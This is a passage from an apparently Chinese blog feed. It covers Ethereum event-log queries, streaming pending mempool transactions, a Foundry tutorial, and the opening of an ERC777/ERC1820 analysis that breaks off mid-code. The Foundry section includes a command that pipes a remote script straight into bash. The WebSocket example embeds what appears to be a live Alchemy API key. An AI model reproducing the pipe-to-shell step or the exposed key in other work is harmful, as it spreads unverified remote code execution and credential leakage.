class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    blockNumber: 10437919,</span><br><span class="line">    blockHash: &#39;0x63a0cfea8f60061d569ec739bc909e7e2bed23d70620d4099b648672e0e1b96d&#39;,</span><br><span class="line">    transactionIndex: 0,</span><br><span class="line">    removed: false,</span><br><span class="line">    address: &#39;0x5FbDB2315678afecb367f032d93F642f64180aa3&#39;,</span><br><span class="line">    data: &#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;,    </span><br><span class="line">    topics: [</span><br><span class="line">      &#39;0x336bea1cd71b6fced353b888a0beae82acd2a0b7a3c283407f4b79af29cfa7ab&#39;</span><br><span class="line">    ],</span><br><span class="line">    transactionHash: &#39;0x18196a4c3350f1356269c8943b45bbb6685bcd67ff957f5f7beed2ab7c7be91e&#39;,</span><br><span class="line">    logIndex: 0</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>ether.js—<code>Contract.queryFilter()</code>函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    blockNumber: 10437919,</span><br><span class="line">    blockHash: &#39;0x63a0cfea8f60061d569ec739bc909e7e2bed23d70620d4099b648672e0e1b96d&#39;,</span><br><span class="line">    transactionIndex: 0,</span><br><span class="line">    removed: false,</span><br><span class="line">    address: &#39;0x5FbDB2315678afecb367f032d93F642f64180aa3&#39;,</span><br><span class="line">    data: &#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;,</span><br><span class="line">    topics: [</span><br><span class="line">      &#39;0x336bea1cd71b6fced353b888a0beae82acd2a0b7a3c283407f4b79af29cfa7ab&#39;</span><br><span class="line">    ],</span><br><span class="line">    transactionHash: &#39;0x18196a4c3350f1356269c8943b45bbb6685bcd67ff957f5f7beed2ab7c7be91e&#39;,</span><br><span class="line">    logIndex: 0,</span><br><span class="line">    removeListener: [Function (anonymous)],</span><br><span class="line">    getBlock: [Function (anonymous)],</span><br><span class="line">    getTransaction: [Function (anonymous)],</span><br><span class="line">    getTransactionReceipt: [Function (anonymous)],</span><br><span class="line">    event: &#39;Return&#39;,</span><br><span class="line">    eventSignature: &#39;Return(uint256)&#39;,</span><br><span class="line">    decode: [Function (anonymous)],</span><br><span class="line">    args: [ BigNumber &#123; value: &quot;1&quot; &#125;, num: BigNumber &#123; value: &quot;1&quot; &#125; ]</span><br><span class="line">  &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>可以看到由于<code>provider.getLogs()</code>函数获取的数据是从日志里拿的，已经筛除掉了一部分的交易信息。</p><p>其他两个函数获取的数据差距不大，ether.js—<code>Contract.queryFilter()</code>函数的数据会全一点。</p><h2 id="获取待处理交易流："><a href="#获取待处理交易流：" class="headerlink" title="获取待处理交易流："></a>获取待处理交易流：</h2><h3 id="什么是待处理交易"><a href="#什么是待处理交易" class="headerlink" title="什么是待处理交易"></a>什么是待处理交易</h3><p>要在以太坊网络编写或者更新任何内容，需要有人创建，签署和发送交易。交易是外部世界与以太坊网络通信的方式。当发送到以太坊网络时，交易会停留在称为“mempool”的队列中，交易等待旷工被处理——- 处于这种等待交易称为待处理交易。发送交易所需要的少量费用称为gas;交易被旷工包含在一个区块中，并且根据它们包含的给旷工的gas 价格来确定优先级 。</p><p>查看<a href="https://www.quicknode.com/guides/defi/how-to-access-ethereum-mempool" target="_blank" rel="noopener">这里</a>, 将得到关于内存池和待处理交易的更多信息。</p><p><strong>我为什么需要查看未处理的交易呢？</strong></p><p>通过检查待处理的交易，可以执行以下操作：</p><ul><li>估计gas：理论上我们可以查看待处理的交易来预测下一个区块的最优gas价格。</li><li>用于交易分析：我们可以分析去中心化交易所中的待处理交易，以便预测市场趋势。</li><li>交易抢跑：在 DeFi 中，你可以预览即将到来的与价格（预言机）相关的交易，并可能对 MKR、COMP 和其他协议的保险库发出清算。</li></ul><p>我们将使用WebSockets处理这些待处理的交易流</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ethers = <span class="built_in">require</span>(<span class="string">"ethers"</span>);</span><br><span class="line"><span class="keyword">var</span> url = <span class="string">"https://eth-mainnet.g.alchemy.com/v2/iNABHFEHRYWb6KW1pzG2c-_qGkmnLLo8"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> init = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> customWsProvider = <span class="keyword">new</span> ethers.providers.WebSocketProvider(url);</span><br><span class="line">  <span class="built_in">console</span>.log(customWsProvider.listeners.toString())</span><br><span class="line">  customWsProvider.on(<span class="string">"pending"</span>, (tx) =&gt; &#123;</span><br><span class="line">    customWsProvider.getTransaction(tx).then(<span class="function"><span class="keyword">function</span> (<span class="params">transaction</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(transaction);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  customWsProvider._websocket.on(<span class="string">"error"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Unable to connect to <span class="subst">$&#123;ep.subdomain&#125;</span> retrying in 3s...`</span>);</span><br><span class="line">    setTimeout(init, <span class="number">3000</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">  customWsProvider._websocket.on(<span class="string">"close"</span>, <span class="keyword">async</span> (code) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(</span><br><span class="line">      <span class="string">`Connection lost with code <span class="subst">$&#123;code&#125;</span>! Attempting reconnect in 3s...`</span></span><br><span class="line">    );</span><br><span class="line">    customWsProvider._websocket.terminate();</span><br><span class="line">    setTimeout(init, <span class="number">3000</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">init();</span><br></pre></td></tr></table></figure><p>查询结果：<br><img src="transFlow.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Foundry-很牛逼的框架</title>
      <link href="/Foundry/"/>
      <url>/Foundry/</url>
      
        <content type="html"><![CDATA[<h1 id="Foundry-很牛逼的框架"><a href="#Foundry-很牛逼的框架" class="headerlink" title="Foundry-很牛逼的框架"></a>Foundry-很牛逼的框架</h1><hr><pre><code>author：Thomas_Xu</code></pre><p>最近在做CTF的时候发现题目使用了Foundry来部署，于是抱着好奇心研究了一下Foundry。不得不说，这个框架真的很牛逼，最直观的是他的测试速度。其次是其再测试时可以输出很多详细信息（以后碰到revert再也不用一行代码一行代码的去找错了）</p><p>下面咱们来细说Foundry：</p><h2 id="为什么用Foundry？"><a href="#为什么用Foundry？" class="headerlink" title="为什么用Foundry？"></a>为什么用Foundry？</h2><ul><li>Foundry使用solidity来编写单元测试，而不是JavaScript或python</li><li>编译和测试的速度快</li><li>内置模糊测试</li><li>Gas优化工具</li><li>很详尽的Traces信息</li><li>支持主网分叉</li><li>Etherscan 代码验证</li><li>硬件钱包兼容</li><li>通过作弊代码操纵区块链状态</li></ul><p>展示一段测试结果，大家就能明白foundry的强大<br><img src="Foundry.png" alt=""></p><h2 id="Foundry简介"><a href="#Foundry简介" class="headerlink" title="Foundry简介"></a>Foundry简介</h2><p>Foundry 是一个新出的由rust写的合约开发框架。</p><p>rust一直在改变编程界的格局，btc C语言开发，eth go主导，也有 rust 的eth<br>波卡链 直接rust，兴起跨链的生态。</p><p>快和安全，就是rust 优势吧。在foundry中也体现出了这点。</p><p><a href="https://book.getfoundry.sh/" target="_blank" rel="noopener">Foundry Book</a></p><h2 id="Foundry安装"><a href="#Foundry安装" class="headerlink" title="Foundry安装"></a>Foundry安装</h2><p>由于Foundry是基于Rust开发的，所以在linux下安装会非常方便。</p><h3 id="Linux-Mac"><a href="#Linux-Mac" class="headerlink" title="Linux/Mac:"></a><strong>Linux/Mac</strong>:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -L https:&#x2F;&#x2F;foundry.paradigm.xyz | bash;</span><br><span class="line">foundryup</span><br></pre></td></tr></table></figure><p>两行命令搞定</p><p><strong>Windows</strong>: (需要rust环境，再次不多赘述)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cargo install --git https:&#x2F;&#x2F;github.com&#x2F;foundry-rs&#x2F;foundry --bins --locked</span><br></pre></td></tr></table></figure><p><strong>Docker</strong>:</p><p>你还可以通过docker安装foundry</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull ghcr.io&#x2F;foundry-rs&#x2F;foundry:latest</span><br></pre></td></tr></table></figure><p>但是我在win10上执行<code>cargo install --git https://github.com/foundry-rs/foundry --bins --locked</code>命令时遇到了一点问题，foundry-cli一直安装不成功。最后我发现居然可以直接可以在github上下载exe文件 <a href="https://github.com/foundry-rs/foundry/releases" target="_blank" rel="noopener">github地址</a>，下载完了之后配置一下环境变量，即可正常使用forge,cast,anvil三个核心组件。</p><h2 id="Foundry包含的组件"><a href="#Foundry包含的组件" class="headerlink" title="Foundry包含的组件"></a>Foundry包含的组件</h2><h3 id="forge"><a href="#forge" class="headerlink" title="forge"></a>forge</h3><p>Forge是一个CLI工具，用于构建、测试、模糊测试、部署和验证Solidity合约。Forge同样有很多的子命令。</p><h4 id="init"><a href="#init" class="headerlink" title="init"></a>init</h4><p>它可以初始化一个新的版本库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge init my_gigabrain_protocol</span><br></pre></td></tr></table></figure><h4 id="install"><a href="#install" class="headerlink" title="install"></a>install</h4><p><code>install</code>子命令允许你安装指定版本的依赖项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge install Rari-Capital&#x2F;solmate@v6</span><br></pre></td></tr></table></figure><p>这将安装由<code>Rari-Capital</code>拥有的<code>solmate</code>软件库</p><h4 id="test"><a href="#test" class="headerlink" title="test"></a>test</h4><p>为了运行测试，我们可以使用以下方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge test</span><br></pre></td></tr></table></figure><p>和hardhat类似，我们也可以通过路径去唯一指定test</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge test --match-contract testname</span><br></pre></td></tr></table></figure><h3 id="Cast"><a href="#Cast" class="headerlink" title="Cast"></a>Cast</h3><p>Cast是一个CLI工具，用于对兼容以太坊虚拟机（EVM）的区块链进行RPC调用。使用<code>cast</code>，我们可以进行合约调用，查询数据，并处理编码和解码。<code>cast</code>有很多的子命令，所以要想获得完整的参考，请看Foundry书中的<a href="https://book.getfoundry.sh/reference/cast/" target="_blank" rel="noopener">cast</a>一节.</p><p>cast给我们提供了一个很方便的和EVM交互的工具</p><h3 id="Anvil"><a href="#Anvil" class="headerlink" title="Anvil"></a>Anvil</h3><p>Anvil是一个CLI工具，用于运行本地EVM区块链。它可以与ganache和hardhat节点相媲美，但好像更快。</p><p>要启动Anvil，只需使用avil命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">anvil</span><br></pre></td></tr></table></figure><p>你也可以指定一些参数， 用<code>-v</code>来显示详细日志，如果用<code>-fork-url &lt;FORK_URL&gt;</code>指定URL来分叉一个公共网络，等等。要查看 <code>anvil</code>选项的完整列表，可以使用以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">anvil -h</span><br></pre></td></tr></table></figure><h2 id="Foundry作弊码"><a href="#Foundry作弊码" class="headerlink" title="Foundry作弊码"></a>Foundry作弊码</h2><p>Foundry有一套作弊代码，它可以对区块链的状态进行修改，以方便在测试时使用。这些代码可以直接执行合约：0x7109709ECfa91a80626fF3989D68f67F5b1DD12D 进行调用，但更多时候是通过标准库和vm对象执行。</p><p>你可以通过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address(bytes20(uint160(uint256(keccak256(&quot;hevm cheat code&quot;)))))</span><br></pre></td></tr></table></figure><p>来获取这个地址</p><p><strong>重要的作弊代码有：</strong></p><ul><li><strong>vm.warp(uint256) external;</strong> 设置 block.timestamp</li><li><strong>vm.roll(uint256) external;</strong> 设置 block.height.</li><li><strong>vm.prank(address) external;</strong> 设置地址作为下一次调用的msg.sender</li><li><strong>vm.startPrank(address) external;</strong> 设置地址作为所有后续调用的msg.sender</li><li><strong>vm.stopPrank() external;</strong> 重置后续调用msg.sender为<code>address(this)</code>。</li><li><strong>vm.deal(address, uint256) external;</strong> 设置一个地址的余额，参数：（who，newBalance）。</li><li><strong>vm.expectRevert(bytes calldata) external;</strong> 期待下次调用时出现错误。</li><li><strong>vm.record() external;</strong> 记录所有存储的读和写。</li><li><strong>vm.expectEmit(true, false, false, false); emit Transfer(address(this)); transfer();</strong> 检查事件主题1在两个事件中是否相等</li><li><strong>vm.load(address,bytes32)外部返回(bytes32);</strong> 从一个地址加载一个存储槽</li><li><strong>vm.store(address,bytes32,bytes32) external;</strong> 将一个值存储到一个地址的存储槽中，参数（who, slot, value）。</li></ul><p>这些可以用来改变测试的过程，如在这个例子中，告诉测试套件在调用时期望一个标准的算术错误。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vm.expectRevert(stdError.arithmeticError);</span><br></pre></td></tr></table></figure><p>完整的列表在这里：<a href="https://github.com/foundry-rs/forge-std/blob/master/src/Vm.sol" target="_blank" rel="noopener">https://github.com/foundry-rs/forge-std/blob/master/src/Vm.sol</a></p><h2 id="Gas优化"><a href="#Gas优化" class="headerlink" title="Gas优化"></a>Gas优化</h2><p>编译时的合约Gas报告可以通过foundry.toml配置来设置</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">gas_reports</span> = [<span class="string">"MyContract"</span>, <span class="string">"MyContractFactory"</span>]</span><br></pre></td></tr></table></figure><p>然后用<em>forge test -gas-report</em>选项执行命令。</p><p>优化函数的一个方法是使用测试合约，并在修改前后进行快照对比：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">forge snapshot --snap gas1.txt</span><br><span class="line">&#x2F;&#x2F; make some changes</span><br><span class="line">forge snapshot --diff gas1.txt</span><br></pre></td></tr></table></figure><p>这将提供之前的Gas报告和当前快照之间的差异。</p><h2 id="部署和使用合约"><a href="#部署和使用合约" class="headerlink" title="部署和使用合约"></a>部署和使用合约</h2><p>Foundry也可以用来部署并与智能合约交互。</p><p>要部署一个合约，我们可以使用下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge create --rpc-url https://mainnet.infura.io --private-key abc123456789 src/MyContract.sol:MyContract --constructor-args <span class="string">"Hello Foundry"</span> <span class="string">"Arg2"</span></span><br></pre></td></tr></table></figure><p>注意我们在生产中部署时不应该使用硬编码的私钥。一个选择是使用-ledger或-trezor来通过硬件钱包执行。另外，也可以使用环境变量来存储私钥。</p><p>我们还可以使用forge命令<strong>在etherscan上验证合约</strong>，以便我们能够使用Etherscan的UI和Metamask与之交互。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge verify-contract --chain-id 1 --num-of-optimizations 200 --constructor-args (cast abi-encode &quot;constructor(string)&quot; &quot;Hello Foundry&quot; --compiler-version v0.8.10+commit.fc410830 0xContractAddressHere src&#x2F;MyContract.sol:MyContract ABCetherscanApiKey123</span><br></pre></td></tr></table></figure><p>要生成ABI，可以使用以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge inspect src&#x2F;MyContract.sol abi</span><br></pre></td></tr></table></figure><p>注意任何ABI都可以转换为接口并直接在solidity中使用： <a href="https://gnidan.github.io/abi-to-sol/" target="_blank" rel="noopener">https://gnidan.github.io/abi-to-sol/</a></p><p>如果合约已经被验证，我们也可以使用以下命令来生成一个接口。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cast <span class="keyword">interface</span> <span class="number">0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984</span></span><br></pre></td></tr></table></figure><h2 id="用-Cast-与链上合约交互"><a href="#用-Cast-与链上合约交互" class="headerlink" title="用 Cast 与链上合约交互"></a>用 Cast 与链上合约交互</h2><p>我们可以call 方式调用合约请求链上数据。我们也可以提供凭证（私钥）来发送一个交易，就像我们在metamask中签署一个交易一样。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cast call 0xabc123 &quot;totalSupply()(uint256)&quot; --rpc-url https:&#x2F;&#x2F;eth-mainnet.alchemyapi.io</span><br><span class="line"></span><br><span class="line">cast send 0xabc123 &quot;mint(uint256)&quot; 3 --rpc-url https:&#x2F;&#x2F;eth-mainnet.alchemyapi.io --private-key&#x3D;abc123</span><br></pre></td></tr></table></figure><p>一旦区块被确认，也可以获取交易本身的信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cast tx 0xa1588a7c58a0ac632a9c7389b205f3999b7caee67ecb918d07b80f859aa605fd</span><br></pre></td></tr></table></figure><h2 id="Foundry编写Damn-Defi测试用例"><a href="#Foundry编写Damn-Defi测试用例" class="headerlink" title="Foundry编写Damn_Defi测试用例"></a>Foundry编写Damn_Defi测试用例</h2><p>这是我在油管上看到一个大佬重写的Damn_Defi，我通过跟着此<a href="https://github.com/nicolasgarcia214/damn-vulnerable-defi-foundry" target="_blank" rel="noopener">此测试</a>重做Damn_Defi学到很多</p><p>注：forge install如果失败，把镜像换成国内镜像，然后把lib下的所有文件夹删了再试。</p>]]></content>
      
      
      <categories>
          
          <category> Foundry </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Foundry </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ERC777-1820</title>
      <link href="/ERC777-1820/"/>
      <url>/ERC777-1820/</url>
      
        <content type="html"><![CDATA[<h1 id="ERC777，1820协议分析"><a href="#ERC777，1820协议分析" class="headerlink" title="ERC777，1820协议分析"></a>ERC777，1820协议分析</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="ERC777"><a href="#ERC777" class="headerlink" title="ERC777"></a>ERC777</h2><p>与以太坊生态系统中广泛采用的ERC20标准不同，ERC777标准通常被称为城里的新生儿。一个潜力巨大的孩子。有些人甚至声称ERC777标准是ERC20标准的有效继承者。ERC777标准规范在<a href="https://link.zhihu.com/?target=https%3A//github.com/ethereum/EIPs/blob/master/EIPS/eip-777.md">EIP777（以太坊改进提案</a>文件中有详尽描述。</p><h2 id="ERC777解决了哪些ERC20的问题"><a href="#ERC777解决了哪些ERC20的问题" class="headerlink" title="ERC777解决了哪些ERC20的问题?"></a>ERC777解决了哪些ERC20的问题?</h2><h3 id="转账通知机制"><a href="#转账通知机制" class="headerlink" title="转账通知机制"></a><strong>转账通知机制</strong></h3><p>由于<strong>ERC20 标准没有一个转账通知机制</strong>，很多ERC20代币误转到合约之后，再也没有办法把币转移出来，已经有大量的ERC20 因为这个原因被锁死，如<a href="https://etherscan.io/address/0x9a642d6b3368ddc662CA244bAdf32cDA716005BC" target="_blank" rel="noopener">锁死的QTUM</a>，<a href="https://etherscan.io/address/0x86fa049857e0209aa7d9e616f7eb3b3b78ecfdb0" target="_blank" rel="noopener">锁死的EOS</a> 。</p><h3 id="运营商机制"><a href="#运营商机制" class="headerlink" title="运营商机制"></a>运营商机制</h3><p>假设您希望允许第三方帐户（或合约）使用您的代币。最常见的需求是在使用去中心化交易所智能合约交易代币时。</p><p>此过程中的第一步是你需要通过调用ERC20智能合约上的<code>approve</code>方法函数来批准转账账户并设置他们有权获得的资金限额。除了用你的资金信任第三方之外，你还需要确保支出限额始终足以满足所需的交易，还需考虑gas等因素对交易的影响。</p><p>在ERC777的运营商机制下，你只需要转移操作权限后就什么都不用操心了。</p><h3 id="交易额外信息"><a href="#交易额外信息" class="headerlink" title="交易额外信息"></a>交易额外信息</h3><p>另外一个问题是<strong>ERC20 转账时，无法携带额外的信息</strong>，例如：我们有一些客户希望让用户使用 ERC20 代币购买商品，因为转账没法携带额外的信息， 用户的代币转移过来，不知道用户具体要购买哪件商品，从而展加了线下额外的沟通成本。</p><p>ERC777很好的解决了这些问题，同时ERC777 也兼容 ERC20 标准。因此强烈建议新开发的代币使用ERC777标准。</p><p>ERC777 在 ERC20的基础上定义了 <code>send(dest, value, data)</code> 来转移代币， send函数额外的参数用来携带其他的信息，send函数会检查持有者和接收者是否实现了相应的钩子函数，如果有实现（不管是普通用户地址还是合约地址都可以实现钩子函数），则调用相应的钩子函数。</p><h3 id="交易监听"><a href="#交易监听" class="headerlink" title="交易监听"></a>交易监听</h3><p>由于ERC1820接口的实现，使ERC777具有很完备的交易监听机制，利用这种监听可以完成许多功能，例如慈善机构的捐款记录，支出情况监听，等等。</p><blockquote><p>ERC20 标准下，可以通过一个变通的办法，采用两个交易组合完成，方法是：第1步：先让用户把要转移的金额用 ERC20 的approve 授权的存币合约（这步通常称为解锁），第2步：再次让用户调用存币合约的计息函数，目标函数中通过 transferFrom 把代币从用户手里转移的合约内，并开始监听到交易后的操作。</p></blockquote><h2 id="ERC1820-接口注册表合约"><a href="#ERC1820-接口注册表合约" class="headerlink" title="ERC1820 接口注册表合约"></a>ERC1820 接口注册表合约</h2><p>即便是一个普通用户地址，同样可以实现对 ERC777 转账的监听， 听起来有点神奇，其实这是通过 ERC1820 接口注册表合约来是实现的。</p><blockquote><p>ERC1820 相当的重要，以至于ERC777单独把它拆出来作为一个EIP。</p></blockquote><h3 id="动机"><a href="#动机" class="headerlink" title="动机"></a>动机</h3><p>在以太坊上有很多方法定义伪自省，<a href="https://learnblockchain.cn/docs/eips/eip-165.html" target="_blank" rel="noopener">ERC165</a>不能由普通用户帐户使用。 <a href="https://github.com/ethereum/EIPs/issues/672" target="_blank" rel="noopener">ERC672</a> 则使用了反向 <a href="https://ens.domains/" target="_blank" rel="noopener">ENS</a>，反向 <a href="https://ens.domains/" target="_blank" rel="noopener">ENS</a> 有两个问题：增加了不必要的复杂度，其次，<a href="https://ens.domains/" target="_blank" rel="noopener">ENS</a> 是由多签控制的中心化合约。 从理论上讲，这种多签能够修改系统。</p><p>ERC1820标准比 <a href="https://github.com/ethereum/EIPs/issues/672" target="_blank" rel="noopener">ERC672</a> 简单得多，并且完全去中心化。</p><p>此标准还为所有链提供一个唯一（相同的）地址<code>0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24</code>。从而解决了解决不同链的查找注册表地址的问题。</p><h3 id="ERC1820规范"><a href="#ERC1820规范" class="headerlink" title="ERC1820规范"></a>ERC1820规范</h3><p>以下是ERC1820的源码及解释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.5.3;</span><br><span class="line">&#x2F;&#x2F; IV is value needed to have a vanity address starting with &#39;0x1820&#39;.</span><br><span class="line">&#x2F;&#x2F; IV: 53759</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;&#x2F; @dev 如果合约为其他的地址实现了接口， 则必须实现这个接口。</span><br><span class="line">interface ERC1820ImplementerInterface &#123;</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 指示合约是否为地址 “addr” 实现接口 “interfaceHash”。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param interfaceHash 接口名称的 keccak256 哈希值</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param addr 为哪一个地址实现接口</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @return 只有当合约为地址&#39;addr&#39;实现&#39;interfaceHash&#39;时返回 ERC1820_ACCEPT_MAGIC</span><br><span class="line">    function canImplementInterfaceForAddress(bytes32 interfaceHash, address addr) external view returns(bytes32);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span 